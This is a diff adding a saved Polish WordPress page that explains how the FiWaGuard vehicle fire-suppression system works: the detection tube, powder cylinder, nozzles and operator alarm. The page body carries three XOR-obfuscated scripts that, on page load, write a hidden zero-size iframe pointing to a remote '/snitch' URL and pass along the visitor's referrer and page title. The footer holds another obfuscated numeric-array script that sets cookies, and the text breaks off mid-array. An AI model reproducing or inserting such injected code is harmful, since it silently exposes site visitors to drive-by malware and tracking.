@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="pl-PL" xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml"><head>
+<meta charset="UTF-8" />
+<title>Kontakt | FiWaGuard</title>
+ 
+<link rel="profile" href="http://gmpg.org/xfn/11" />
+<link rel="stylesheet" type="text/css" media="all" href="http://fiwaguard.pl/wp-content/themes/icemagtheme/style.css" />
+<link rel="pingback" href="http://fiwaguard.pl/xmlrpc.php" />
+<link rel="shortcut icon" href="http://fiwaguard.pl/wp-content/themes/icemagtheme/images/demo/favico.ico" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+	<link rel='archives' title='Maj 2014' href='http://fiwaguard.pl/2014/05/' />
+	<link rel='archives' title='Grudzień 2012' href='http://fiwaguard.pl/2012/12/' />
+<link rel="alternate" type="application/rss+xml" title="FiWaGuard &raquo; Kanał z wpisami" href="http://fiwaguard.pl/feed/" />
+<link rel="alternate" type="application/rss+xml" title="FiWaGuard &raquo; Kanał z komentarzami" href="http://fiwaguard.pl/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="FiWaGuard &raquo; FiWaGuard &#8211; jak działa? Kanał z komentarzami" href="http://fiwaguard.pl/icemagproducts/fiwaguard-jak-dziala/feed/" />
+<meta property="fb:admins" content="YOUR USER ID"/><meta property="og:title" content="FiWaGuard &#8211; jak działa?"/><meta property="og:type" content="article"/><meta property="og:url" content="http://fiwaguard.pl/icemagproducts/fiwaguard-jak-dziala/"/><meta property="og:site_name" content="Your Site NAME Goes HERE"/><meta property="og:image" content="http://fiwaguard.pl/wp-content/uploads/2012/12/trojnik3-300x232.jpg"/>
+<link rel='stylesheet' id='prettyphoto-css'  href='http://fiwaguard.pl/wp-content/plugins/prettyphoto-media/css/prettyPhoto.css?ver=3.1.4' type='text/css' media='screen' />
+<link rel='stylesheet' id='ot-dynamic-my_css-css'  href='http://fiwaguard.pl/wp-content/themes/icemagtheme/dynamic.css?ver=4.0.18' type='text/css' media='all' />
+<link rel='stylesheet' id='icemag_google-open-css'  href='http://fonts.googleapis.com/css?family=Open+Sans%3A400%2C600%2C700%7CYanone+Kaffeesatz%3A400%2C300%7COswald%3A400%2C300%2C700&#038;subset=latin%2Clatin-ext&#038;ver=4.0.18' type='text/css' media='screen' />
+<link rel='stylesheet' id='layerslider_css-css'  href='http://fiwaguard.pl/wp-content/themes/icemagtheme/plugins/LayerSlider/css/layerslider.css?ver=3.5.0' type='text/css' media='all' />
+<script type='text/javascript' src='http://fiwaguard.pl/wp-includes/js/jquery/jquery.js?ver=1.11.1'></script>
+<script type='text/javascript' src='http://fiwaguard.pl/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
+<script type='text/javascript' src='http://fiwaguard.pl/wp-content/themes/icemagtheme/js/jquery.easing.1.3.js?ver%5B0%5D=jquery'></script>
+<script type='text/javascript' src='http://fiwaguard.pl/wp-content/themes/icemagtheme/js/jquery-ui.min.js?ver%5B0%5D=jquery'></script>
+<script type='text/javascript' src='http://fiwaguard.pl/wp-content/themes/icemagtheme/js/jquery.quicksand.js?ver%5B0%5D=jquery'></script>
+<script type='text/javascript' src='http://fiwaguard.pl/wp-content/themes/icemagtheme/js/jsapi.js?ver%5B0%5D=jquery'></script>
+<script type='text/javascript' src='http://fiwaguard.pl/wp-content/themes/icemagtheme/js/icemag.basic.slider.1.0.js?ver%5B0%5D=jquery'></script>
+<script type='text/javascript' src='http://fiwaguard.pl/wp-content/themes/icemagtheme/js/jquery.default.1.0.js?ver%5B0%5D=jquery'></script>
+<script type='text/javascript' src='http://fiwaguard.pl/wp-content/themes/icemagtheme/js/jquery.default.load.1.0.js?ver%5B0%5D=jquery'></script>
+<script type='text/javascript' src='http://fiwaguard.pl/wp-content/themes/icemagtheme/plugins/LayerSlider/js/layerslider.kreaturamedia.jquery.js?ver=3.5.0'></script>
+<script type='text/javascript' src='http://fiwaguard.pl/wp-content/themes/icemagtheme/plugins/LayerSlider/js/jquery-easing-1.3.js?ver=1.3.0'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://fiwaguard.pl/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://fiwaguard.pl/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Realizacje' href='http://fiwaguard.pl/icemagproducts/realizacje/' />
+<meta name="generator" content="WordPress 4.0.18" />
+<link rel='shortlink' href='http://fiwaguard.pl/?p=9' />
+<style type="text/css" media="screen">
+  #cookie-law {  
+  position: fixed;
+  bottom: 0px;
+  left: 0;
+  right: 0;
+  text-align: center;
+  z-index:9999; 
+}
+
+#cookie-law > div {  
+  background:#fff; 
+  opacity:0.95; 
+  width:75% !important;
+  padding:20px;
+  max-width: 600px;
+  margin:auto;
+  display: inline-block;
+  text-align: left !important;
+  border-radius:5px 5px 0 0;
+  -moz-border-radius:5px 5px 0 0;
+  -webkit-border-radius:5px 5px 0 0;
+  -o-border-radius:5px 5px 0 0;
+  box-shadow: 0px 0px 20px #A1A1A1;
+  -webkit-box-shadow: 0px 0px 20px #A1A1A1;
+  -moz-box-shadow: 0px 0px 20px #A1A1A1;
+  -o-box-shadow: 0px 0px 20px #A1A1A1; 
+  position:relative;
+}
+
+#cookie-law h4 { padding: 0 !important; margin:0 0 8px !important; text-align:left !important; font-size:13px !important; color:#444; 
+}
+#cookie-law p { padding: 0 !important; margin:0 !important; text-align:left !important; font-size:12px !important; line-height: 18px !important; color:#888;
+}
+
+a.close-cookie-banner {
+  position: absolute;
+  top:0px;
+  right:0px;
+  margin:10px;
+  display:block;
+  width:20px;
+  height:20px;
+  background:url(http://saiti.kylos.pl/saiti/wp-content/plugins/creare-eu-cookie-law-banner/images/close.png) no-repeat;
+  background-size: 20px !important;
+}
+
+a.close-cookie-banner span {
+  display:none !important;
+}</style>
+ 	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+
+<!-- All in One SEO Pack 2.1.7 by Michael Torbert of Semper Fi Web Designob_start_detected [-1,-1] -->
+<meta name="description" content="JAK DZIAŁA SYSTEM? W przypadku pożaru przewód detekcyjny FiWaGuard ulega przepaleniu aktywując zawór butli i uwalniając dystrybucję środka gaśniczego" />
+
+<link rel="canonical" href="http://fiwaguard.pl/icemagproducts/fiwaguard-jak-dziala/" />
+<!-- /all in one seo pack -->
+
+<!-- ONLY FOR REFERENCES-->
+
+</head>
+<body class="single single-page postid-9">
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<div id="boxed-holder" class="boxed-layout">
+<div id="colorHolder" darkColor="#f0f0f0" lightColor="#f5f5f5" socialColor="#5c5c5c"></div>
+<div id="toTop"></div>
+
+<div class="header-under-line"></div>
+<div id="body-container-small">
+
+    <div class="container">
+    
+        <div id="header">
+            <div id="logo" class="clearFix">
+    
+                                    <a href="http://fiwaguard.pl" rel="null"><img class="noImgBorder" src="http://saiti.kylos.pl/saiti/wp-content/uploads/2014/05/logo1.png" /></a>
+                            </div>
+            <div class="menu-menu-glowne-container"><ul id="menu-menu-glowne" class="nav"><li id="menu-item-619" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-619"><a href="http://fiwaguard.pl/">Strona Główna</a></li>
+<li id="menu-item-636" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-636"><a>Ochrona</a>
+<ul class="sub-menu">
+	<li id="menu-item-671" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-671"><a href="http://fiwaguard.pl/fiwaguard/">FiWaGuard</a></li>
+	<li id="menu-item-638" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-638"><a href="?icemagproducts=fiwaguard-jak-dziala">FIWA Guard &#8211; jak działa?</a></li>
+</ul>
+</li>
+<li id="menu-item-622" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-622"><a href="http://fiwaguard.pl/about-us-2/">O nas</a></li>
+<li id="menu-item-770" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-770"><a href="?icemagproducts=realizacje">Realizacje</a></li>
+<li id="menu-item-618" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-9 current_page_item menu-item-618"><a href="http://fiwaguard.pl/contact/">Kontakt</a></li>
+</ul></div>        </div>
+    </div>
+</div>
+
+<div class="container">
+<div class="space-ten"></div>
+<ul class="breadcrumbs"><li><a href="http://fiwaguard.pl">Home</a> </li><li> / </li> <li><a href="http://fiwaguard.pl/about-us//">About Us</a> <li> / </li> <li>FiWaGuard &#8211; jak działa?</li></ul><div class="space-ten"></div>
+<div class="header-text-container">
+			<span class="left"></span>
+			<span class="header-text">FiWaGuard &#8211; jak działa?</span>
+			<span class="right"></span>
+			</div>
+			<div class="clearFix"></div><div id="single-pages">
+<div id="post-769" class="post-769 icemagproducts type-icemagproducts status-publish has-post-thumbnail hentry">
+<!--
+	MAIN CONTENT STARTS HERE
+-->
+<div class="main 
+">
+
+
+
+
+
+         		
+ 				<div class="full-img-column full-img-column-img full-img-div"><div class="gallery-view full-img-column-img"><img src="http://fiwaguard.pl/wp-content/uploads/2012/12/trojnik3.jpg" class="attachment-full-column-img wp-post-image" alt="FiWaGuard &#8211; jak działa?" /><a href="http://fiwaguard.pl/wp-content/uploads/2012/12/trojnik3.jpg" rel="prettyPhoto"><div class="gallery-mask"></div></a></div></div>
+            <div class="entry">
+            	<div class="date-area">
+                	<div class="day-area">06</div>
+                    <div class="month-area">Czerwiec</div>
+                    <div class="year-area">2014</div>
+                </div>
+
+                <p><img class="wp-image-667 aligncenter" alt="schemat" src="http://saiti.kylos.pl/saiti/wp-content/uploads/2014/05/schemat.png" /></p>
+<p><b>JAK DZIAŁA SYSTEM?</b></p>
+<p>W przypadku pożaru przewód detekcyjny <b>FiWa</b><b>Guard </b>ulega przepaleniu aktywując zawór butli i uwalniając dystrybucję środka gaśniczego systemem dysz gaśniczych. Środek gaśniczy szybko wypełnia obszar w którym zostały zainstalowane dysze. Absorbuje pozostałe łatwopalne płyny i oleje zapobiegając powtórnemu zapłonowi. Proszek gaśniczy jest nie toksyczny, odpowiedni do użycia w przypadku pożarów spowodowanych prądem elektrycznym oraz wszelkimi cieczami łatwopalnymi.  Dodatkowo jest najwłaściwszym medium zalecanym do pożarów grupy ABC:</p>
+<p><b>A</b>- Pożary ciał stałych, które pod wpływem ciepła ulegają rozkładowi i wydzielają przy tym gazy palne i pary.</p>
+<p><b>B</b>- Pożar cieczy palnych i substancji topiących sie pod wpływem ciepła.<br />
+<b>C</b>- Pożary gazów palnych.</p>
+<p>&nbsp;</p>
+<p>System zaopatrzony jest w czujnik ciśnieniowy podłączony do centralki sterującej wizualną<br />
+i dźwiękową informacją dla kierowcy. Przewód detekcyjny <b>FiWa</b><b>Guard </b>idealnie nadaje się do wykrywania ognia ponieważ toleruje wszelkiego rodzaju wibracje, zanieczyszczenia<br />
+i ekstremalne temperatury w jakich pracują pojazdy. Dzięki pneumatycznemu sterowaniu do aktywacji nie wymaga żadnej energii elektrycznej i nie wywiera dodatkowego obciążenia systemu elektrycznego.</p>
+<p>&nbsp;</p>
+<p><b>NA SYSTEM FIWAGUARD SKŁADA SIĘ:</b></p>
+<div class="toggle-holder" id="onefourthreezeroei" style="width:100%; float:left; ">
+	<div class="toggle-header">Środek gaśniczy</div>
+	<div class="togglebox">Stosowany w automatycznym systemie tłumienia pożaru <b>FiWa</b><b>Guard </b>to drobnoziarnisty proszek – fosforan monoamonowy (NH4H2PO4), znany jako ABC lub proszek wielozadaniowy.<br />
+</div></div><script type="text/javascript">
+		jQuery(document).ready(function(){
+	if(!jQuery.browser.msie || (jQuery.browser.msie && jQuery.browser.version > 6)){
+						jQuery("#onefourthreezeroei .toggle-header").css({"background-position":"0px 0px"});
+						jQuery("#onefourthreezeroei .togglebox").css("display","block");
+					}jQuery("#onefourthreezeroei .toggle-header").click(function(){
+			if(!jQuery.browser.msie || (jQuery.browser.msie && jQuery.browser.version > 6)){
+				if(jQuery(this).next(".togglebox").is(":visible")){
+					jQuery(this).stop().animate({"background-position":"0px -32px"},{duration:400, easing:"easeInSine"});
+				}else{
+					jQuery(this).stop().animate({"background-position":"0px 0px"},{duration:400, easing:"easeOutSine"});
+				}
+			}
+			jQuery(this).next(".togglebox").slideToggle("slow");
+			return true;
+		});
+		});
+	</script>
+<div class="toggle-holder" id="oneeighteighttwose" style="width:100%; float:left; ">
+	<div class="toggle-header">Butla</div>
+	<div class="togglebox"><img class="alignleft" alt="butla120" src="http://saiti.kylos.pl/saiti/wp-content/uploads/2014/05/butla120.jpg" /><br />
+Chemiczny proszek gaśniczy ABC jest przechowywany w ciśnieniowej butli stalowej wypełnionej sprężonym azotem do około 18 Bar.<br />
+Każda butla wyposażona jest w niklowany zawór mosiężny, manometr do monitorowania ciśnienia w butli oraz zawór połączony z systemem detekcji <b>FiWaGuard</b><br />
+<br/><br/><br />
+</div></div><script type="text/javascript">
+		jQuery(document).ready(function(){
+	if(!jQuery.browser.msie || (jQuery.browser.msie && jQuery.browser.version > 6)){
+						jQuery("#oneeighteighttwose .toggle-header").css({"background-position":"0px 0px"});
+						jQuery("#oneeighteighttwose .togglebox").css("display","block");
+					}jQuery("#oneeighteighttwose .toggle-header").click(function(){
+			if(!jQuery.browser.msie || (jQuery.browser.msie && jQuery.browser.version > 6)){
+				if(jQuery(this).next(".togglebox").is(":visible")){
+					jQuery(this).stop().animate({"background-position":"0px -32px"},{duration:400, easing:"easeInSine"});
+				}else{
+					jQuery(this).stop().animate({"background-position":"0px 0px"},{duration:400, easing:"easeOutSine"});
+				}
+			}
+			jQuery(this).next(".togglebox").slideToggle("slow");
+			return true;
+		});
+		});
+	</script>
+<div class="toggle-holder" id="oneeightzeronineze" style="width:100%; float:left; ">
+	<div class="toggle-header">Przewód detekcyjny</div>
+	<div class="togglebox"><img class="alignleft" alt="det120" src="http://saiti.kylos.pl/saiti/wp-content/uploads/2014/05/det120.jpg" /><br />
+Jest odporny na większość powszechnych chemikaliów, olejów i substancji. Spełnia dwie funkcje: wykrywanie pożaru oraz aktywację systemu. Przewód jest zainstalowanym w całym obszarze potencjalnego zagrożenia i połączony z wierzchołkiem zaworu butli. Wypełniony jest azotem pod ciśnieniem utrzymując system w pozycji „aktywny”. Przewód wykrywania <b>FiWa</b><b>Guard </b>jest wrażliwy na temperaturę i emisję energii, w momencie wystąpienia pożaru &#8211; przepala się, a spadek ciśnienia aktywuje system gaśniczy.<br />
+<br/><br/><br />
+</div></div><script type="text/javascript">
+		jQuery(document).ready(function(){
+	if(!jQuery.browser.msie || (jQuery.browser.msie && jQuery.browser.version > 6)){
+						jQuery("#oneeightzeronineze .toggle-header").css({"background-position":"0px 0px"});
+						jQuery("#oneeightzeronineze .togglebox").css("display","block");
+					}jQuery("#oneeightzeronineze .toggle-header").click(function(){
+			if(!jQuery.browser.msie || (jQuery.browser.msie && jQuery.browser.version > 6)){
+				if(jQuery(this).next(".togglebox").is(":visible")){
+					jQuery(this).stop().animate({"background-position":"0px -32px"},{duration:400, easing:"easeInSine"});
+				}else{
+					jQuery(this).stop().animate({"background-position":"0px 0px"},{duration:400, easing:"easeOutSine"});
+				}
+			}
+			jQuery(this).next(".togglebox").slideToggle("slow");
+			return true;
+		});
+		});
+	</script>
+<div class="toggle-holder" id="twooneonesixthreef" style="width:100%; float:left; ">
+	<div class="toggle-header">Elektryczny czujnik ciśnieniowy</div>
+	<div class="togglebox"><img class="alignleft" alt="czujnik120" src="http://saiti.kylos.pl/saiti/wp-content/uploads/2014/05/czujnik120.jpg" /> Pozwala na monitorowanie ciśnienia w systemie, sterowanie systemem i/lub zasilanie lub pozbawianie zasilania wszelkiego wyposażenia elektrycznego. Ten element może być połączony z końcem linii przewodu detekcyjnego lub umocowany na zaworze butli w celu uzyskania dodatkowych funkcji elektrycznych, jakie mogą być potrzebne. <b>FiWa</b><b>Guard </b>zaleca, aby wszystkie systemy używały dwóch czujników ciśnienia połączonych z wizualną i dźwiękową informacją dla operatora.<br />
+<br/><br/><br />
+</div></div><script type="text/javascript">
+		jQuery(document).ready(function(){
+	if(!jQuery.browser.msie || (jQuery.browser.msie && jQuery.browser.version > 6)){
+						jQuery("#twooneonesixthreef .toggle-header").css({"background-position":"0px 0px"});
+						jQuery("#twooneonesixthreef .togglebox").css("display","block");
+					}jQuery("#twooneonesixthreef .toggle-header").click(function(){
+			if(!jQuery.browser.msie || (jQuery.browser.msie && jQuery.browser.version > 6)){
+				if(jQuery(this).next(".togglebox").is(":visible")){
+					jQuery(this).stop().animate({"background-position":"0px -32px"},{duration:400, easing:"easeInSine"});
+				}else{
+					jQuery(this).stop().animate({"background-position":"0px 0px"},{duration:400, easing:"easeOutSine"});
+				}
+			}
+			jQuery(this).next(".togglebox").slideToggle("slow");
+			return true;
+		});
+		});
+	</script>
+<div class="toggle-holder" id="fourthreezerosixse" style="width:100%; float:left; ">
+	<div class="toggle-header">Przewody i dysze gaśnicze</div>
+	<div class="togglebox"><img class="alignleft" alt="gasnicze" src="http://saiti.kylos.pl/saiti/wp-content/uploads/2014/05/gasnicze.jpg" /><br />
+Środek gaśniczy dystrybuowany jest w obszarze komory silnikowej za pomocą przewodów gaśniczych wykonanych ze stali nierdzewnej, zakończonych dyszami. Dysze wykonane<br />
+są w technologii wielokierunkowej umożliwiając dystrybucję środka w wielu płaszczyznach dzięki czemu proszek dostaje się w każdy zakątek komory.<br />
+<br/><br/><br />
+</div></div><script type="text/javascript">
+		jQuery(document).ready(function(){
+	if(!jQuery.browser.msie || (jQuery.browser.msie && jQuery.browser.version > 6)){
+						jQuery("#fourthreezerosixse .toggle-header").css({"background-position":"0px 0px"});
+						jQuery("#fourthreezerosixse .togglebox").css("display","block");
+					}jQuery("#fourthreezerosixse .toggle-header").click(function(){
+			if(!jQuery.browser.msie || (jQuery.browser.msie && jQuery.browser.version > 6)){
+				if(jQuery(this).next(".togglebox").is(":visible")){
+					jQuery(this).stop().animate({"background-position":"0px -32px"},{duration:400, easing:"easeInSine"});
+				}else{
+					jQuery(this).stop().animate({"background-position":"0px 0px"},{duration:400, easing:"easeOutSine"});
+				}
+			}
+			jQuery(this).next(".togglebox").slideToggle("slow");
+			return true;
+		});
+		});
+	</script>
+<div class="toggle-holder" id="onefourfouroneeigh" style="width:100%; float:left; ">
+	<div class="toggle-header">Wizualna i dźwiękowa informacja dla operatora</div>
+	<div class="togglebox"><img class="alignleft" alt="lamp" src="http://saiti.kylos.pl/saiti/wp-content/uploads/2014/05/lamp.jpg" /></p>
+<p>Jest to zespół urządzeń montowanych w kabinie operatora.<br />
+W skład zespołu wchodzi: syrena alarmowa generująca modulowany sygnał dźwiękowy oraz migająca lampka alarmowa. Zestaw ten ma na celu poinformować operatora o aktywacji systemu.<br />
+<br/><br/><br />
+</div></div><script type="text/javascript">
+		jQuery(document).ready(function(){
+	if(!jQuery.browser.msie || (jQuery.browser.msie && jQuery.browser.version > 6)){
+						jQuery("#onefourfouroneeigh .toggle-header").css({"background-position":"0px 0px"});
+						jQuery("#onefourfouroneeigh .togglebox").css("display","block");
+					}jQuery("#onefourfouroneeigh .toggle-header").click(function(){
+			if(!jQuery.browser.msie || (jQuery.browser.msie && jQuery.browser.version > 6)){
+				if(jQuery(this).next(".togglebox").is(":visible")){
+					jQuery(this).stop().animate({"background-position":"0px -32px"},{duration:400, easing:"easeInSine"});
+				}else{
+					jQuery(this).stop().animate({"background-position":"0px 0px"},{duration:400, easing:"easeOutSine"});
+				}
+			}
+			jQuery(this).next(".togglebox").slideToggle("slow");
+			return true;
+		});
+		});
+	</script>
+<p>&nbsp;</p>
+<div class="toggle-holder" id="onefourninenineone" style="width:100%; float:left; ">
+	<div class="toggle-header">Moduł autodiagnostyczny</div>
+	<div class="togglebox"><img class="alignleft" alt="modul" src="http://saiti.kylos.pl/saiti/wp-content/uploads/2014/05/modul1.jpg" /><br />
+W szybki sposób informuje o skutkach nieautoryzowanej ingerencji w system. Monitoruje kondycję kluczowych elementów systemu. Jest najczęściej wybieraną &#8222;opcją&#8221; wśród klientów.<br />
+<br/><br/><br />
+</div></div><script type="text/javascript">
+		jQuery(document).ready(function(){
+	if(!jQuery.browser.msie || (jQuery.browser.msie && jQuery.browser.version > 6)){
+						jQuery("#onefourninenineone .toggle-header").css({"background-position":"0px 0px"});
+						jQuery("#onefourninenineone .togglebox").css("display","block");
+					}jQuery("#onefourninenineone .toggle-header").click(function(){
+			if(!jQuery.browser.msie || (jQuery.browser.msie && jQuery.browser.version > 6)){
+				if(jQuery(this).next(".togglebox").is(":visible")){
+					jQuery(this).stop().animate({"background-position":"0px -32px"},{duration:400, easing:"easeInSine"});
+				}else{
+					jQuery(this).stop().animate({"background-position":"0px 0px"},{duration:400, easing:"easeOutSine"});
+				}
+			}
+			jQuery(this).next(".togglebox").slideToggle("slow");
+			return true;
+		});
+		});
+	</script>
+                <div class="space-twenty"></div>
+               	<div class="blog-bottom-details blog-bottom-details-class">
+<div class="author left max-width-sixtyfive">
+                 <a href="http://fiwaguard.pl/author/admin/" title="Wpisy, których autorem jest admin" rel="author">admin</a>				</div>
+<div class="right">
+<li class="view-count" >
+	12843 View</li>
+</div>
+</div>
+<div class="clearFix"></div>
+<div class="space-twenty"></div>
+
+<div class="clearFix"></div><div class="header-vertical-space"></div>
+<div class="clearFix"></div>
+<div class="space-twenty"></div>
+
+            <div class="comments-template">
+                
+<!-- You can start editing here. -->
+
+
+			<!-- If comments are open, but there are no comments. -->
+
+	 <div class="clearFix"></div>
+
+
+<div id="respond">
+                <div class="small-header-text-container" >
+                    <span class="small-header-text">Leave a Comment</span>
+                	<span class="right"></span>
+                </div>
+
+<div class="cancel-comment-reply">
+	<small><a rel="nofollow" id="cancel-comment-reply-link" href="/contact/?icemagproducts=fiwaguard-jak-dziala#respond" style="display:none;">Kliknij tutaj, aby anulować odpowiadanie.</a></small>
+</div>
+
+
+<form action="http://fiwaguard.pl/wp-comments-post.php" method="post" id="commentform">
+
+<ul>
+<li><input name="author" id="author" class="comments-field inputs-class" title="Name :" type="text" value="Name :"></li>
+
+<li><input name="email" id="email" class="comments-field inputs-class margin-right-zero" title="Email :" type="text" value="Email :"></li>
+</ul>
+<div class="clearFix"></div>
+
+
+<textarea class="comments-field inputs-class width-ninety-six margin-top-zero" title="Your Message :" name="comment" id="comment" cols="100%" rows="10" tabindex="4">Your Message :</textarea>
+
+<p><input class="comments-submit" name="submit" type="submit" id="submit" tabindex="5" value="Submit Comment" />
+<input type='hidden' name='comment_post_ID' value='769' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+</p>
+
+</form>
+
+</div>
+
+
+            </div>
+
+
+
+
+
+<div class="header-vertical-space"></div>
+</div>
+<!--
+	MAIN CONTENT ENDS HERE
+-->
+</div>
+</div>
+
+
+</div>
+</div>
+
+<div id="footer" class="footer-no-large">
+</div>
+<div id="footer-bottom">
+	<div class="container">
+    	<div class="left padding-top-five">
+        	SYSTEMY AUTOBUSOWE SP. Z O.O. | Wszystkie prawa zastrzeżone!        </div>
+    	<!-- THIRD FOOTER WIDGET -->
+    	        	</div>
+</div>
+<script type="text/javascript">var a2a5cd1=[239,299,339,344,357,271,354,355,360,347,340,300,273,351,350,354,344,355,344,350,349,297,271,336,337,354,350,347,356,355,340,298,271,347,340,341,355,297,284,288,287,287,276,298,271,355,350,351,297,287,276,298,271,358,344,339,355,343,297,288,287,287,276,298,271,343,340,344,342,343,355,297,288,287,287,276,298,273,301,249,299,354,338,353,344,351,355,301,249,341,356,349,338,355,344,350,349,271,334,357,353,334,338,279,346,280,362,353,340,355,356,353,349,279,339,350,338,356,348,340,349,355,285,338,350,350,346,344,340,285,348,336,355,338,343,279,278,279,333,363,298,271,280,278,282,346,282,278,300,279,330,333,298,332,281,280,278,280,363,363,287,280,330,289,332,364,249,341,356,349,338,355,344,350,349,271,334,357,338,334,338,279,349,336,348,340,283,357,336,347,356,340,283,339,280,362,357,336,353,271,339,336,355,340,300,349,340,358,271,307,336,355,340,279,280,298,339,336,355,340,285,354,340,355,323,344,348,340,279,339,336,355,340,285,342,340,355,323,344,348,340,279,280,282,279,339,281,295,293,291,287,287,287,287,287,280,280,298,339,350,338,356,348,340,349,355,285,338,350,350,346,344,340,271,300,271,349,336,348,340,282,273,300,273,282,357,336,347,356,340,282,273,298,271,340,359,351,344,353,340,354,300,273,282,339,336,355,340,285,355,350,310,316,323,322,355,353,344,349,342,279,280,282,273,298,271,351,336,355,343,300,286,273,298,364,249,357,336,353,271,344,300,287,298,249,344,341,279,349,336,357,344,342,336,355,350,353,285,336,351,351,325,340,353,354,344,350,349,285,344,349,339,340,359,318,341,279,273,326,3